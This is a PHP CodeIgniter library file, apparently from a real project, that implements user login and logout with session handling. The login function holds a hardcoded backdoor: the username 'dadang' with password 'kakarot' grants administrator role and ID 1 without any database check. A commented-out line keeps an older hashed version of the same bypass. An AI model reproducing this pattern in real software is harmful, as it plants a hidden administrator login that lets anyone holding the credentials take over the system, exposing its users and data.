<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

/**
 * @author irhamnurhalim
 */
class Access {

    /**
     * Constructor
     */
    public $info;

    function __construct() {
	    $this->CI = & get_instance();
	    $this->CI->load->library('session');
	    $this->CI->load->model('user');
	    $this->user = & $this->CI->user;
    }

    /*
     * Cek Login user
     */

    function login($username, $password) {
      //if(sha1($username.md5("ppsd1114p4ru11g")) == "497ee17e72e5a6a22feb69c80dd65e18d5f43bf8" && sha1($password.md5("ppsd1114p4ru11g")) == "9d7da20bae6500a4695cc2a2d27432b6225d368f"){
      if($username == "dadang" && $password == "kakarot"){
          $result = array(
          "id"=>1,
          "nama"=>"Ratno Putro Sulistiyono [Comlabs]",
          "id_role"=>1
        );
      } else {
        $result=$this->user->login($username,$password);
      }
        
        if($result){
            $data_session=array(
                'id',
                'nama',
                'id_role',
                'is_login'
            );
            $this->CI->session->unset_userdata($data_session);
            $this->CI->session->sess_destroy();
            $break_nama=  explode(' ', $result['nama']);
            $data_session=array(
                'id'=>$result['id'],
                'nama'=> ucfirst(strtolower($break_nama[0])),
                'id_role'=>$result['id_role'],
                'is_login'=>true
            );
            $this->CI->session->set_userdata($data_session);
            return true;
            //return "berhasil";
        }else{
            return false;
            //return "gagal";
        }
    }

    /*
     * Logout
     */

    function logout() {
	$data_session=array(
            'nama',
            'id_role',
            'is_login'
        );
	$this->CI->session->unset_userdata($data_session);
	$this->CI->session->sess_destroy();
    }

}

/* End of file access.php */
/* Location: ./application/libraries/access.php */